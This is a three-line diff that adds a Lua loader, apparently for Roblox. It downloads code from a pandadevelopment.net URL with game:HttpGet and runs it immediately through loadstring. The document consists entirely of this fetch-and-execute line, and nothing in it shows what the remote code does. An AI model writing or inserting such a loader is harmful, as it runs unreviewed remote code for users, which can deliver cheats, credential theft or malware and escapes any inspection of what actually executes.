@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/" .. ({
+    [1772283358541] = "17552564611b4d7d",
+})))()
